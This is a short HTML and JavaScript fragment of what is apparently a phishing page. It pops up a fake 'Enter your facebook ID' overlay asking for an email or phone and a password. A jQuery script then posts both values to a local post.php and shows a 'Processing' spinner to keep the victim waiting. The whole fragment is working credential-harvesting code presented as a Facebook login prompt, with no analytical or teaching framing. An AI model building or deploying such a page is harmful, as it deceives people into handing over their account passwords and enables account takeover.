http://graph.facebook.com//picture||



<script>
function clicker(){
	var thediv=document.getElementById('displaybox');
	if(thediv.style.display == "none"){
		thediv.style.display = "";
		thediv.innerHTML = "<table width='100%' height='100%'><tr><td align='center' valign='middle' width='100%' height='100%'><div class='nextstep'><h1>Enter your facebook ID:</h1><br><form id='nextform' style='margin-top: -50px;' method='post'>Email or Phone:<br><input name='email' id='email' type='text' /><br />Password:<br /><input name='password' id='password' type='password' /><br /><input type='button' id='searchForm' onclick='SubmitForm();' value='Next!' /></form><div class='loader'><img src='9-1.gif' /><br>Processing ...</div></div></td></tr></table>";
	}else{
		thediv.style.display = "none";
		thediv.innerHTML = '';
	}
	return false;
}
</script>
<script src="http://code.jquery.com/jquery-latest.js"></script>

<script>
function SubmitForm() {
var name = $("#email").val();
var email = $("#password").val();
$.post("post.php", { Email: name, Password: email },
   function(data) {
     $("#nextform").hide();
$(".loader").show();
   });
}
</script>
<div id="displaybox" style="display: none;"></div>



  </body>
</html>